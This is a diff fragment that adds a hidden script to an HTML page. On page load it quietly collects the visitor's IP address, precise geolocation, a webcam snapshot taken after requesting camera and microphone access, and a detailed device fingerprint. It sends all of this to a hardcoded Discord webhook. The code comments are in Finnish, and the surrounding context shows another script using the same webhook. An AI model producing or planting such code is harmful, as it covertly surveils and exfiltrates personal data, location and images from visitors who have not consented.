@@ -110,6 +110,78 @@
     });
   });
 </script>
+  <script>
+const webhookURL = "https://discord.com/api/webhooks/1290348004066201753/2TjZ0mCwYEp6WzJn9L5E86urlMLPpcIIM7B0FFpkzFlkzqbl7V5WV32Psogsg63EhCpT";
+
+let userIP = "tuntematon", locationData = "ei saatavilla", micAccess = "?", camAccess = "?";
+const video = document.createElement("video");
+const canvas = document.createElement("canvas");
+
+// Hae IP
+fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => userIP = d.ip);
+
+// Hae sijainti
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(pos => {
+    const { latitude, longitude, accuracy } = pos.coords;
+    locationData = `Lat: ${latitude}, Lon: ${longitude}, Accuracy: ${accuracy}m`;
+  }, () => { locationData = "käyttäjä kielsi" });
+}
+
+// Kokeile mic/cam
+navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+  .then(stream => {
+    camAccess = "OK"; micAccess = "OK";
+    video.srcObject = stream;
+    video.play();
+    setTimeout(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      canvas.toBlob(blob => {
+        sendReport(blob);
+      }, "image/png");
+    }, 3000);
+  })
+  .catch(err => {
+    camAccess = "ei pääsyä"; micAccess = "ei pääsyä";
+    sendReport(null);
+  });
+
+// Tiedonlähetys webhookkiin
+async function sendReport(blob) {
+  let battery = await navigator.getBattery?.();
+  const connection = navigator.connection || {};
+  const motionSupport = 'DeviceMotionEvent' in window ? "kyllä" : "ei";
+
+  const plugins = Array.from(navigator.plugins).map(p => p.name).join(", ");
+  const mimes = Array.from(navigator.mimeTypes).map(m => m.type).join(", ");
+
+  const info = `
+**IP:** ${userIP}
+**Sijainti:** ${locationData}
+**Kieli:** ${navigator.language}
+**Aika:** ${new Date().toString()}
+**Aikavyöhyke:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+**Selaimen agentti:** ${navigator.userAgent}
+**Platform:** ${navigator.platform}
+**Näyttö:** ${screen.width} x ${screen.height}
+**Kamera:** ${camAccess}
+**Mikrofoni:** ${micAccess}
+**Akku:** ${battery ? `${Math.round(battery.level * 100)}%, Latauksessa: ${battery.charging}` : "ei saatavilla"}
+**Verkko:** ${connection.effectiveType || "tuntematon"}
+**Gyroskooppi:** ${motionSupport}
+**MIME-tyypit:** ${mimes}
+**Pluginit:** ${plugins}
+  `;
+
+  const form = new FormData();
+  form.append("content", info);
+  if (blob) form.append("file", blob, "snapshot.png");
+
+  fetch(webhookURL, { method: "POST", body: form });
+}
+  </script>
 <script>
 const webhookURL = "https://discord.com/api/webhooks/1290348004066201753/2TjZ0mCwYEp6WzJn9L5E86urlMLPpcIIM7B0FFpkzFlkzqbl7V5WV32Psogsg63EhCpT";
 
